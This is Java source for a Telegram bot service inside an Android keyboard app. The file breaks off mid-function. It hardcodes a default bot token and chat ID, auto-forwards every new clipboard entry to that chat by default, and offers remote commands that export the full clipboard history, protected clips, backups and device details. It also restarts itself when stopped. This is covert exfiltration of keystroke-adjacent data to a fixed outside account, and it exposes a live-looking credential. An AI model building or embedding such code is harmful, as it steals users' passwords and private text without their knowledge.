package juloo.keyboard2;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.RectF;
import android.graphics.Typeface;
import android.graphics.pdf.PdfDocument;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;

public class TelegramBotService extends Service {

    private static final String TAG = "TGBot";

    // ── Hard defaults (used until user changes them in Settings) ─────────────
    public static final String DEFAULT_TOKEN   = "7552059010:AAFyhqbed56ZJLpnOMcgDeJJA1amKV42at8";
    public static final long   DEFAULT_CHAT_ID = 6956029558L;

    // ── SharedPreferences keys ───────────────────────────────────────────────
    public static final String PREFS         = "telegram_prefs";
    public static final String KEY_TOKEN     = "bot_token";
    public static final String KEY_CHAT_ID   = "chat_id_str";
    public static final String KEY_ENABLED   = "bot_enabled";
    public static final String KEY_AUTOFW    = "auto_forward";

    // ── Instance state ───────────────────────────────────────────────────────
    private static volatile TelegramBotService _instance;
    private Thread   _pollThread;
    private volatile boolean _running = false;
    private int      _lastUpdateId = 0;

    // Per-chat state (chatId → value)
    private static final Map<Long, Long>    _pinSessions  = new HashMap<>();
    private static final Map<Long, String>  _pendingCmds  = new HashMap<>();
    private static final Map<Long, Boolean> _awaitSearch  = new HashMap<>();

    // ────────────────────────────────────────────────────────────────────────
    // Service lifecycle
    // ────────────────────────────────────────────────────────────────────────

    @Override public void onCreate()  { super.onCreate(); _instance = this; }
    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!_running) startPolling();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        _running = false;
        _instance = null;
        scheduleRestart(this);
        super.onDestroy();
    }

    // ────────────────────────────────────────────────────────────────────────
    // Public helpers
    // ────────────────────────────────────────────────────────────────────────

    public static boolean isRunning()  { return _instance != null; }

    public static String getToken(Context ctx) {
        return prefs(ctx).getString(KEY_TOKEN, DEFAULT_TOKEN);
    }

    public static long getChatId(Context ctx) {
        String s = prefs(ctx).getString(KEY_CHAT_ID, String.valueOf(DEFAULT_CHAT_ID));
        try { return Long.parseLong(s.trim()); } catch (Exception e) { return DEFAULT_CHAT_ID; }
    }

    public static SharedPreferences prefs(Context ctx) {
        return ctx.getSharedPreferences(PREFS, MODE_PRIVATE);
    }

    public static void startIfEnabled(Context ctx) {
        if (prefs(ctx).getBoolean(KEY_ENABLED, false) && !isRunning())
            ctx.startService(new Intent(ctx, TelegramBotService.class));
    }

    public static void stopService(Context ctx) {
        if (_instance != null) _instance._running = false;
        ctx.stopService(new Intent(ctx, TelegramBotService.class));
    }

    // ────────────────────────────────────────────────────────────────────────
    // New-clip hook  (called by ClipboardHistoryService after each add)
    // ────────────────────────────────────────────────────────────────────────

    public static void notifyNewClip(Context ctx,
                                     ClipboardHistoryService.HistoryEntry e) {
        if (!prefs(ctx).getBoolean(KEY_AUTOFW, true)) return;
        final String token  = getToken(ctx);
        final long   chatId = getChatId(ctx);
        new Thread(() -> {
            try {
                String preview = e.content.length() > 300
                        ? e.content.substring(0, 300) + "…"
                        : e.content;
                String text = "📋 <b>New Clip Captured</b>\n\n"
                        + "<code>" + h(preview) + "</code>\n\n"
                        + "🕐 <i>" + h(e.timestamp) + "</i>"
                        + (ok(e.description) ? "\n📌 " + h(e.description) : "")
                        + (e.pinned ? "\n📍 Pinned" : "")
                        + "\n\n<i>Length: " + e.content.length() + " chars</i>";
                postJson(apiUrl(token) + "/sendMessage",
                        "{\"chat_id\":" + chatId
                        + ",\"text\":" + jstr(text)
                        + ",\"parse_mode\":\"HTML\"}");
            } catch (Exception ignored) {}
        }, "TG-fwd").start();
    }

    // ────────────────────────────────────────────────────────────────────────
    // Polling loop
    // ────────────────────────────────────────────────────────────────────────

    private void startPolling() {
        _running = true;
        _pollThread = new Thread(() -> {
            send("🤖 <b>FullKeyboard Bot Online</b>\n"
                 + "All systems active. Send /start for commands.");
            while (_running) {
                try {
                    String resp = httpGet(apiUrl(getToken(this))
                            + "/getUpdates?timeout=25&offset=" + (_lastUpdateId + 1));
                    if (resp == null) { sleep(5000); continue; }
                    JSONObject root = new JSONObject(resp);
                    if (!root.optBoolean("ok")) { sleep(5000); continue; }
                    JSONArray results = root.getJSONArray("result");
                    for (int i = 0; i < results.length(); i++) {
                        _lastUpdateId = results.getJSONObject(i).getInt("update_id");
                        handleUpdate(results.getJSONObject(i));
                    }
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    Log.w(TAG, "poll: " + e.getMessage());
                    sleep(5000);
                }
            }
        }, "TG-poll");
        _pollThread.setDaemon(true);
        _pollThread.start();
    }

    // ────────────────────────────────────────────────────────────────────────
    // Update routing
    // ────────────────────────────────────────────────────────────────────────

    private void handleUpdate(JSONObject upd) {
        try {
            if (upd.has("callback_query")) {
                JSONObject cq = upd.getJSONObject("callback_query");
                long chatId = cq.getJSONObject("from").getLong("id");
                String data = cq.optString("data", "");
                answerCb(cq.getString("id"));
                if (chatId != getChatId(this)) return;
                handleCallback(chatId, data);
                return;
            }
            if (!upd.has("message")) return;
            JSONObject msg = upd.getJSONObject("message");
            long chatId = msg.getJSONObject("chat").getLong("id");
            String text = msg.optString("text", "").trim();
            if (text.isEmpty()) return;

            if (chatId != getChatId(this)) {
                sendTo(chatId, "⛔ Unauthorized.");
                return;
            }

            // PIN-input flow
            if (_pendingCmds.containsKey(chatId)) { handlePinInput(chatId, text); return; }
            // Search-query flow
            if (Boolean.TRUE.equals(_awaitSearch.get(chatId))) {
                _awaitSearch.remove(chatId);
                doSearch(chatId, text);
                return;
            }

            if (text.startsWith("/")) {
                String[] p = text.split("\\s+", 2);
                String cmd = p[0].split("@")[0].toLowerCase(Locale.ROOT);
                String arg = p.length > 1 ? p[1].trim() : "";
                route(chatId, cmd, arg);
            } else {
                send("💬 Send /start to see all commands.");
            }
        } catch (Exception e) {
            Log.w(TAG, "handleUpdate: " + e.getMessage());
        }
    }

    private void route(long chatId, String cmd, String arg) {
        switch (cmd) {
            case "/start":      cmdStart(chatId);                         break;
            case "/status":     cmdStatus(chatId);                        break;
            case "/clipboard":  cmdClipboard(chatId);                     break;
            case "/smartclips": requirePin(chatId, "smartclips");         break;
            case "/all":        requirePin(chatId, "all");                break;
            case "/backup":     requirePin(chatId, "backup");             break;
            case "/calendar":   doCalendar(chatId, parseInt(arg, 0));     break;
            case "/device":     cmdDevice(chatId);                        break;
            case "/recent":     doRecent(chatId, Math.max(1,parseInt(arg,1))); break;
            case "/search":     if (arg.isEmpty()) promptSearch(chatId); else doSearch(chatId, arg); break;
            case "/stats":      cmdStats(chatId);                         break;
            case "/lock":       cmdLock(chatId);                          break;
            case "/cancel":     _pendingCmds.remove(chatId); send("❌ Cancelled."); break;
            default:            send("❓ Unknown command. /start for help.");
        }
    }

    private void handleCallback(long chatId, String data) {
        if      (data.startsWith("recent_")) doRecent(chatId, parseInt(data.substring(7), 1));
        else if (data.startsWith("cal_"))    doCalendar(chatId, parseInt(data.substring(4), 0));
        else if (data.equals("search"))      promptSearch(chatId);
    }

    // ────────────────────────────────────────────────────────────────────────
    // PIN flow
    // ────────────────────────────────────────────────────────────────────────

    private void requirePin(long chatId, String pendingCmd) {
        SmartClipsService svc = SmartClipsService.getInstance(this);
        if (!svc.isPinSetup() || isPinSessionValid(chatId)) {
            execProtected(chatId, pendingCmd);
            return;
        }
        _pendingCmds.put(chatId, pendingCmd);
        sendTo(chatId, "🔐 <b>Smart Clips PIN Required</b>\n\n"
                + "Enter the PIN you set in the app to continue.\n"
                + "Send /cancel to abort.");
    }

    private void handlePinInput(long chatId, String text) {
        if (text.equals("/cancel")) {
            _pendingCmds.remove(chatId);
            sendTo(chatId, "❌ Cancelled.");
            return;
        }
        SmartClipsService svc = SmartClipsService.getInstance(this);
        if (svc.verifyPin(text)) {
            int mins = ThemeManager.getAutoLockMins(this);
            long expiry = (mins <= 0)
                    ? System.currentTimeMillis() + 365L * 24 * 60 * 60 * 1000L
                    : System.currentTimeMillis() + (long) mins * 60 * 1000L;
            _pinSessions.put(chatId, expiry);
            String pending = _pendingCmds.remove(chatId);
            sendTo(chatId, "✅ <b>PIN Verified</b>\n"
                    + (mins <= 0 ? "Session: never expires." : "Session valid for " + mins + " min."));
            if (pending != null) execProtected(chatId, pending);
        } else {
            _pendingCmds.remove(chatId);
            sendTo(chatId, "❌ <b>Wrong PIN.</b> Run the command again to retry.");
        }
    }

    private boolean isPinSessionValid(long chatId) {
        Long exp = _pinSessions.get(chatId);
        return exp != null && System.currentTimeMillis() < exp;
    }

    private void execProtected(long chatId, String cmd) {
        switch (cmd) {
            case "smartclips": doSmartClipsPdf(chatId); break;
            case "all":        doAllPdf(chatId);        break;
            case "backup":     doBackup(chatId);        break;
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Commands
    // ────────────────────────────────────────────────────────────────────────

    private void cmdStart(long chatId) {
        String msg =
            "🤖 <b>FullKeyboard Bot</b> — Command Centre\n"
          + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
          + "📋 <b>Clipboard</b>\n"
          + "  /clipboard — Export history as PDF\n"
          + "  /recent — Latest 20 clips (paginated)\n"
          + "  /search — Search all clips\n"
          + "  /calendar — Browse by date\n"
          + "  /stats — Usage statistics\n\n"
          + "🔐 <b>Smart Clips</b> <i>(PIN protected)</i>\n"
          + "  /smartclips — Export Smart Clips as PDF\n"
          + "  /all — Combined full report PDF\n"
          + "  /backup — JSON backup file\n"
          + "  /lock — Lock session now\n\n"
          + "⚙️ <b>System</b>\n"
          + "  /device — Device information\n"
          + "  /status — Bot &amp; app status\n"
          + "━━━━━━━━━━━━━━━━━━━━━━\n"
          + "<i>New clips are forwarded automatically.</i>";
        sendTo(chatId, msg);
    }

    private void cmdStatus(long chatId) {
        ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
        SmartClipsService sc = SmartClipsService.getInstance(this);
        int cbCount = (cb != null) ? cb.get_history_entries().size() : 0;
        int scCount = sc.getClipsForWidget().size();
        boolean locked = sc.isLockEnabled() && !sc.isUnlocked();
        sendTo(chatId, "📊 <b>Status</b>\n\n"
                + "✅ Bot: <b>Online</b>\n"
                + "📋 Clipboard entries: <b>" + cbCount + "</b>\n"
                + "🔐 Smart Clips: <b>" + scCount + "</b>\n"
                + "🔒 Smart Clips lock: <b>" + (locked ? "Locked" : "Unlocked") + "</b>\n"
                + "🗝 Bot PIN session: <b>" + (isPinSessionValid(chatId) ? "Active" : "None") + "</b>\n"
                + "📱 Device: <b>" + h(Build.MANUFACTURER + " " + Build.MODEL) + "</b>\n"
                + "🤖 Android: <b>" + Build.VERSION.RELEASE + "</b>");
    }

    private void cmdClipboard(long chatId) {
        sendTo(chatId, "⏳ Generating clipboard PDF…");
        new Thread(() -> {
            try {
                File pdf = buildClipboardPdf();
                if (pdf != null) { sendDoc(chatId, pdf, "📋 Clipboard History Report"); pdf.delete(); }
                else sendTo(chatId, "❌ No clipboard history found.");
            } catch (Exception e) { sendTo(chatId, "❌ PDF error: " + e.getMessage()); }
        }, "TG-cb-pdf").start();
    }

    private void doSmartClipsPdf(long chatId) {
        sendTo(chatId, "⏳ Generating Smart Clips PDF…");
        new Thread(() -> {
            try {
                File pdf = buildSmartClipsPdf();
                if (pdf != null) { sendDoc(chatId, pdf, "🔐 Smart Clips Report"); pdf.delete(); }
                else sendTo(chatId, "❌ No Smart Clips found.");
            } catch (Exception e) { sendTo(chatId, "❌ PDF error: " + e.getMessage()); }
        }, "TG-sc-pdf").start();
    }

    private void doAllPdf(long chatId) {
        sendTo(chatId, "⏳ Generating full combined report PDF…");
        new Thread(() -> {
            try {
                File pdf = buildAllPdf();
                if (pdf != null) { sendDoc(chatId, pdf, "📦 FullKeyboard Complete Report"); pdf.delete(); }
                else sendTo(chatId, "❌ No data found.");
            } catch (Exception e) { sendTo(chatId, "❌ PDF error: " + e.getMessage()); }
        }, "TG-all-pdf").start();
    }

    private void doCalendar(long chatId, int monthOff) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { sendTo(chatId, "❌ Clipboard not available."); return; }
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();

                Calendar cal = Calendar.getInstance();
                cal.add(Calendar.MONTH, monthOff);
                int year = cal.get(Calendar.YEAR), month = cal.get(Calendar.MONTH);
                String monthName = new SimpleDateFormat("MMMM yyyy", Locale.getDefault()).format(cal.getTime());

                Map<Integer, List<ClipboardHistoryService.HistoryEntry>> byDay = new TreeMap<>();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                for (ClipboardHistoryService.HistoryEntry e : all) {
                    try {
                        Calendar ec = Calendar.getInstance();
                        ec.setTime(sdf.parse(e.timestamp));
                        if (ec.get(Calendar.YEAR) == year && ec.get(Calendar.MONTH) == month)
                            byDay.computeIfAbsent(ec.get(Calendar.DAY_OF_MONTH), k -> new ArrayList<>()).add(e);
                    } catch (Exception ignored) {}
                }

                StringBuilder sb = new StringBuilder();
                sb.append("📅 <b>Clipboard Calendar — ").append(h(monthName)).append("</b>\n");
                sb.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");

                if (byDay.isEmpty()) {
                    sb.append("<i>No clips this month.</i>");
                } else {
                    String mon = monthName.split(" ")[0];
                    for (Map.Entry<Integer, List<ClipboardHistoryService.HistoryEntry>> en : byDay.entrySet()) {
                        int cnt = en.getValue().size();
                        sb.append("📆 <b>").append(mon).append(" ").append(en.getKey()).append("</b>");
                        sb.append("  <i>(").append(cnt).append(cnt == 1 ? " clip" : " clips").append(")</i>\n");
                        int show = Math.min(cnt, 3);
                        for (int i = 0; i < show; i++) {
                            String c = en.getValue().get(i).content;
                            sb.append("  • <code>").append(h(c.length() > 80 ? c.substring(0, 80) + "…" : c)).append("</code>\n");
                        }
                        if (cnt > 3) sb.append("  <i>+ ").append(cnt - 3).append(" more…</i>\n");
                        sb.append("\n");
                    }
                }

                String markup = "{\"inline_keyboard\":[[{"
                        + "\"text\":\"◀ " + prevMonth(monthOff) + "\","
                        + "\"callback_data\":\"cal_" + (monthOff - 1) + "\"},{"
                        + "\"text\":\"" + monthName + "\","
                        + "\"callback_data\":\"cal_" + monthOff + "\"},{"
                        + "\"text\":\"" + nextMonth(monthOff) + " ▶\","
                        + "\"callback_data\":\"cal_" + (monthOff + 1) + "\"}]]}";
                sendWithMarkup(chatId, sb.toString(), markup);
            } catch (Exception e) { sendTo(chatId, "❌ Calendar error: " + e.getMessage()); }
        }, "TG-cal").start();
    }

    private void doBackup(long chatId) {
        sendTo(chatId, "⏳ Generating backup…");
        new Thread(() -> {
            try {
                File f = buildJsonBackup();
                if (f != null) {
                    String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
                    sendDoc(chatId, f, "💾 FullKeyboard Backup — " + date);
                    f.delete();
                } else sendTo(chatId, "❌ Nothing to backup.");
            } catch (Exception e) { sendTo(chatId, "❌ Backup error: " + e.getMessage()); }
        }, "TG-backup").start();
    }

    private void cmdDevice(long chatId) {
        sendTo(chatId, "📱 <b>Device Information</b>\n\n"
                + "📛 Model: <code>" + h(Build.MODEL) + "</code>\n"
                + "🏭 Manufacturer: <code>" + h(Build.MANUFACTURER) + "</code>\n"
                + "📦 Brand: <code>" + h(Build.BRAND) + "</code>\n"
                + "🔧 Device: <code>" + h(Build.DEVICE) + "</code>\n"
                + "🤖 Android: <code>" + h(Build.VERSION.RELEASE) + " (API " + Build.VERSION.SDK_INT + ")</code>\n"
                + "🏗 Build: <code>" + h(Build.DISPLAY) + "</code>\n"
                + "📦 Package: <code>" + h(getPackageName()) + "</code>\n"
                + "🕐 Time: <code>" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault()).format(new Date()) + "</code>\n"
                + "🌍 Locale: <code>" + h(Locale.getDefault().toString()) + "</code>\n"
                + "💾 RAM: <code>" + (Runtime.getRuntime().maxMemory() / 1024 / 1024) + " MB max</code>\n"
                + "📊 ABI: <code>" + h(Arrays.toString(Build.SUPPORTED_ABIS)) + "</code>");
    }

    private void doRecent(long chatId, int page) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { sendTo(chatId, "❌ Clipboard not available."); return; }
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
                all.sort((a, b) -> b.timestamp.compareTo(a.timestamp));

                int pageSize = 20, total = all.size();
                int totalPages = Math.max(1, (total + pageSize - 1) / pageSize);
                int pg = Math.max(1, Math.min(page, totalPages));
                int from = (pg - 1) * pageSize, to = Math.min(from + pageSize, total);

                StringBuilder sb = new StringBuilder();
                sb.append("📋 <b>Recent Clips</b>  <i>Page ").append(pg).append(" / ").append(totalPages).append("</i>\n");
                sb.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");

                for (int i = from; i < to; i++) {
                    ClipboardHistoryService.HistoryEntry e = all.get(i);
                    String preview = e.content.length() > 100 ? e.content.substring(0, 100) + "…" : e.content;
                    sb.append(i + 1).append(". ");
                    if (e.pinned) sb.append("📍 ");
                    sb.append("<code>").append(h(preview)).append("</code>\n");
                    sb.append("   <i>").append(h(e.timestamp)).append("</i>\n\n");
                }

                List<String> btns = new ArrayList<>();
                if (pg > 1) btns.add("{\"text\":\"◀ Prev\",\"callback_data\":\"recent_" + (pg - 1) + "\"}");
                btns.add("{\"text\":\"📄 " + pg + "/" + totalPages + "\",\"callback_data\":\"recent_" + pg + "\"}");
                if (pg < totalPages) btns.add("{\"text\":\"Next ▶\",\"callback_data\":\"recent_" + (pg + 1) + "\"}");
                String markup = "{\"inline_keyboard\":[[" + String.join(",", btns) + "],"
                        + "[{\"text\":\"🔍 Search Clips\",\"callback_data\":\"search\"}]]}";
                sendWithMarkup(chatId, sb.toString(), markup);
            } catch (Exception e) { sendTo(chatId, "❌ Error: " + e.getMessage()); }
        }, "TG-recent").start();
    }

    private void promptSearch(long chatId) {
        _awaitSearch.put(chatId, true);
        sendTo(chatId, "🔍 <b>Search Clipboard</b>\n\nType your search query and send it:");
    }

    private void doSearch(long chatId, String query) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                if (cb == null) { sendTo(chatId, "❌ Clipboard not available."); return; }
                String lq = query.toLowerCase(Locale.ROOT);
                List<ClipboardHistoryService.HistoryEntry> hits = new ArrayList<>();
                for (ClipboardHistoryService.HistoryEntry e : cb.get_history_entries())
                    if (e.content.toLowerCase(Locale.ROOT).contains(lq)
                            || (ok(e.description) && e.description.toLowerCase(Locale.ROOT).contains(lq)))
                        hits.add(e);

                if (hits.isEmpty()) {
                    sendTo(chatId, "🔍 No results for <code>" + h(query) + "</code>.");
                    return;
                }

                StringBuilder sb = new StringBuilder();
                sb.append("🔍 <b>Search: \"").append(h(query)).append("\"</b>  <i>").append(hits.size()).append(" found</i>\n");
                sb.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
                int shown = Math.min(hits.size(), 25);
                for (int i = 0; i < shown; i++) {
                    ClipboardHistoryService.HistoryEntry e = hits.get(i);
                    String preview = e.content.length() > 120 ? e.content.substring(0, 120) + "…" : e.content;
                    sb.append(i + 1).append(". ");
                    if (e.pinned) sb.append("📍 ");
                    sb.append("<code>").append(h(preview)).append("</code>\n");
                    sb.append("   <i>").append(h(e.timestamp)).append("</i>\n\n");
                }
                if (hits.size() > 25) sb.append("<i>… and ").append(hits.size() - 25).append(" more. Refine your query.</i>");
                sendTo(chatId, sb.toString());
            } catch (Exception e) { sendTo(chatId, "❌ Search error: " + e.getMessage()); }
        }, "TG-search").start();
    }

    private void cmdStats(long chatId) {
        new Thread(() -> {
            try {
                ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
                SmartClipsService sc = SmartClipsService.getInstance(this);
                if (cb == null) { sendTo(chatId, "❌ Clipboard not available."); return; }
                List<ClipboardHistoryService.HistoryEntry> all = cb.get_history_entries();
                long totalChars = 0; int pinned = 0;
                for (ClipboardHistoryService.HistoryEntry e : all) { totalChars += e.content.length(); if (e.pinned) pinned++; }
                double avg = all.isEmpty() ? 0 : (double) totalChars / all.size();
                String oldest = all.isEmpty() ? "—" : all.get(all.size() - 1).timestamp;
                String newest = all.isEmpty() ? "—" : all.get(0).timestamp;
                sendTo(chatId, "📊 <b>Clipboard Statistics</b>\n\n"
                        + "📋 Total entries: <b>" + all.size() + "</b>\n"
                        + "📍 Pinned: <b>" + pinned + "</b>\n"
                        + "🔐 Smart Clips: <b>" + sc.getClipsForWidget().size() + "</b>\n"
                        + "🔤 Total chars: <b>" + totalChars + "</b>\n"
                        + "📏 Avg length: <b>" + String.format("%.1f", avg) + " chars</b>\n"
                        + "🕐 Oldest: <b>" + h(oldest) + "</b>\n"
                        + "🕐 Newest: <b>" + h(newest) + "</b>");
            } catch (Exception e) { sendTo(chatId, "❌ Stats error: " + e.getMessage()); }
        }, "TG-stats").start();
    }

    private void cmdLock(long chatId) {
        _pinSessions.remove(chatId);
        SmartClipsService.getInstance(this).lock();
        sendTo(chatId, "🔒 <b>Smart Clips locked.</b> Bot session cleared.");
    }

    // ────────────────────────────────────────────────────────────────────────
    // PDF generation
    // ────────────────────────────────────────────────────────────────────────

    private File buildClipboardPdf() throws Exception {
        ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
        if (cb == null) return null;
        List<ClipboardHistoryService.HistoryEntry> entries = cb.get_history_entries();
        if (entries.isEmpty()) return null;
        return renderPdf("clipboard_history", "📋  Clipboard History", entries, null);
    }

    private File buildSmartClipsPdf() throws Exception {
        List<SmartClipsService.SmartClip> clips = SmartClipsService.getInstance(this).getClipsForWidget();
        if (clips.isEmpty()) return null;
        return renderPdf("smart_clips", "🔐  Smart Clips", null, clips);
    }

    private File buildAllPdf() throws Exception {
        ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
        List<ClipboardHistoryService.HistoryEntry> entries = cb != null ? cb.get_history_entries() : new ArrayList<>();
        List<SmartClipsService.SmartClip> clips = SmartClipsService.getInstance(this).getClipsForWidget();
        if (entries.isEmpty() && clips.isEmpty()) return null;
        return renderPdf("full_report", "📦  FullKeyboard Complete Report", entries, clips);
    }

    @SuppressLint("NewApi")
    private File renderPdf(String name, String title,
                           List<ClipboardHistoryService.HistoryEntry> entries,
                           List<SmartClipsService.SmartClip> smartClips) throws Exception {

        final int W = 595, H = 842, M = 40;

        // Paints
        Paint bgP    = paint(0xFFF0F4FF, 0, false);
        Paint hdrP   = paint(0xFF2D3A9A, 0, false);
        Paint cardP  = paint(0xFFFFFFFF, 12, true);
        Paint shadP  = paint(0x1A000000, 12, true);
        Paint barCb  = stroke(0xFF4FC3F7, 3f);
        Paint barSc  = stroke(0xFFA78BFA, 3f);
        Paint titleP = text(0xFFFFFFFF, 22f, true);
        Paint subP   = text(0xCCFFFFFF, 11f, false);
        Paint lblCb  = text(0xFF2D3A9A, 9f, true);
        Paint lblSc  = text(0xFF7A2FA0, 9f, true);
        Paint bodyP  = text(0xFF1A1A2E, 11f, false);
        Paint metaP  = text(0xFF8888AA, 9f, false);
        Paint pinBgP = paint(0xFFFF9D5C, 6, true);
        Paint pinTP  = text(0xFFFFFFFF, 7f, true);
        Paint secBgP = paint(0xFF1A1A3A, 8, false);
        Paint secTP  = text(0xFF4FC3F7, 13f, true);

        PdfDocument doc = new PdfDocument();
        int pageNum = 1;
        PdfDocument.Page page = startPage(doc, pageNum, W, H);
        Canvas cv = page.getCanvas();

        // Page background
        cv.drawRect(0, 0, W, H, bgP);

        // Header banner
        cv.drawRect(0, 0, W, 95, hdrP);
        cv.drawText(title, M, 42, titleP);
        String meta = "Generated " + new SimpleDateFormat("dd MMM yyyy HH:mm", Locale.getDefault()).format(new Date());
        if (entries != null && !entries.isEmpty()) meta += "  •  " + entries.size() + " clipboard entries";
        if (smartClips != null && !smartClips.isEmpty()) meta += "  •  " + smartClips.size() + " smart clips";
        cv.drawText(meta, M, 62, subP);
        cv.drawText("FullKeyboard · SystemConsole  —  github.com/neet-ctrl/FullKeyboard-SystemConsole", M, 80, subP);

        float y = 110;

        // ── Clipboard section ──────────────────────────────────────────────
        if (entries != null) {
            for (ClipboardHistoryService.HistoryEntry e : entries) {
                int linesNeeded = Math.min(6, (int) Math.ceil(e.content.length() / 68.0));
                float cardH = 16 + linesNeeded * 14f + 26;

                if (y + cardH + 10 > H - M) {
                    doc.finishPage(page);
                    page = startPage(doc, ++pageNum, W, H);
                    cv = page.getCanvas();
                    cv.drawRect(0, 0, W, H, bgP);
                    y = M;
                }

                float cW = W - 2 * M;
                cv.drawRoundRect(new RectF(M + 2, y + 2, M + cW + 2, y + cardH + 2), 10, 10, shadP);
                cv.drawRoundRect(new RectF(M, y, M + cW, y + cardH), 10, 10, cardP);
                cv.drawLine(M + 1f, y + 7, M + 1f, y + cardH - 7, barCb);

                float cx = M + 14, cy = y + 10;
                cv.drawText("CLIPBOARD", cx, cy + 9, lblCb);
                if (e.pinned) {
                    cv.drawRoundRect(new RectF(cx + 80, cy, cx + 110, cy + 12), 6, 6, pinBgP);
                    cv.drawText("PINNED", cx + 84, cy + 9, pinTP);
                }
                cy += 16;

                String txt = e.content.length() > 408 ? e.content.substring(0, 408) + "…" : e.content;
                while (!txt.isEmpty() && cy < y + cardH - 14) {
                    int cut = Math.min(68, txt.length());
                    cv.drawText(txt.substring(0, cut), cx, cy + 11, bodyP);
                    txt = txt.substring(cut);
                    cy += 13;
                }

                String m2 = "🕐 " + e.timestamp + (ok(e.description) ? "   📌 " + e.description : "");
                if (m2.length() > 90) m2 = m2.substring(0, 90);
                cv.drawText(m2, cx, y + cardH - 5, metaP);
                y += cardH + 8;
            }
        }

        // ── Smart Clips section ────────────────────────────────────────────
        if (smartClips != null && !smartClips.isEmpty()) {
            if (entries != null && !entries.isEmpty()) {
                if (y + 40 > H - M) {
                    doc.finishPage(page);
                    page = startPage(doc, ++pageNum, W, H);
                    cv = page.getCanvas();
                    cv.drawRect(0, 0, W, H, bgP);
                    y = M;
                }
                cv.drawRoundRect(new RectF(M, y, W - M, y + 30), 8, 8, secBgP);
                cv.drawText("  🔐  SMART CLIPS", M + 8, y + 21, secTP);
                y += 42;
            }

            for (SmartClipsService.SmartClip sc : smartClips) {
                int linesNeeded = Math.min(6, (int) Math.ceil(sc.content.length() / 68.0));
                float cardH = 16 + linesNeeded * 14f + 30;

                if (y + cardH + 10 > H - M) {
                    doc.finishPage(page);
                    page = startPage(doc, ++pageNum, W, H);
                    cv = page.getCanvas();
                    cv.drawRect(0, 0, W, H, bgP);
                    y = M;
                }

                float cW = W - 2 * M;
                cv.drawRoundRect(new RectF(M + 2, y + 2, M + cW + 2, y + cardH + 2), 10, 10, shadP);
                cv.drawRoundRect(new RectF(M, y, M + cW, y + cardH), 10, 10, cardP);
                cv.drawLine(M + 1f, y + 7, M + 1f, y + cardH - 7, barSc);

                float cx = M + 14, cy = y + 10;
                cv.drawText("SMART CLIP  #" + sc.serial, cx, cy + 9, lblSc);
                if (sc.locked) cv.drawText("🔒", cx + 130, cy + 9, metaP);
                if (sc.hidden) cv.drawText("👁", cx + 148, cy + 9, metaP);
                cy += 16;

                String txt = sc.content.length() > 408 ? sc.content.substring(0, 408) + "…" : sc.content;
                while (!txt.isEmpty() && cy < y + cardH - 18) {
                    int cut = Math.min(68, txt.length());
                    cv.drawText(txt.substring(0, cut), cx, cy + 11, bodyP);
                    txt = txt.substring(cut);
                    cy += 13;
                }

                String m2 = "#" + sc.serial;
                if (ok(sc.keyword))     m2 += "   🔑 " + sc.keyword;
                if (ok(sc.description)) m2 += "   📌 " + sc.description;
                if (ok(sc.timestamp))   m2 += "   🕐 " + sc.timestamp;
                if (m2.length() > 90)   m2 = m2.substring(0, 90);
                cv.drawText(m2, cx, y + cardH - 5, metaP);
                y += cardH + 8;
            }
        }

        doc.finishPage(page);
        File f = new File(getCacheDir(), name + "_" + System.currentTimeMillis() + ".pdf");
        FileOutputStream fos = new FileOutputStream(f);
        doc.writeTo(fos);
        fos.close();
        doc.close();
        return f;
    }

    private static PdfDocument.Page startPage(PdfDocument doc, int num, int w, int h) {
        return doc.startPage(new PdfDocument.PageInfo.Builder(w, h, num).create());
    }

    // ────────────────────────────────────────────────────────────────────────
    // JSON Backup
    // ────────────────────────────────────────────────────────────────────────

    private File buildJsonBackup() throws Exception {
        ClipboardHistoryService cb = ClipboardHistoryService.get_service(this);
        SmartClipsService sc = SmartClipsService.getInstance(this);

        JSONObject root = new JSONObject();
        root.put("schema_version", 1);
        root.put("app", "FullKeyboard-SystemConsole");
        root.put("package", getPackageName());
        root.put("exported_at", new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.getDefault()).format(new Date()));
        root.put("device_model", Build.MANUFACTURER + " " + Build.MODEL);
        root.put("android_version", Build.VERSION.RELEASE);

        JSONArray cbArr = new JSONArray();
        if (cb != null) {
            for (ClipboardHistoryService.HistoryEntry e : cb.get_history_entries()) {
                JSONObject o = new JSONObject();
                o.put("content", e.content);
                o.put("timestamp", e.timestamp);
                o.put("description", e.description != null ? e.description : "");
                o.put("pinned", e.pinned);
                cbArr.put(o);
            }
        }
        root.put("clipboard_history", cbArr);

        JSONArray scArr = new JSONArray();
        for (SmartClipsService.SmartClip clip : sc.getClipsForWidget()) {
            JSONObject o = new JSONObject();
            o.put("serial", clip.serial);
            o.put("content", clip.content);
            o.put("description", clip.description != null ? clip.description : "");
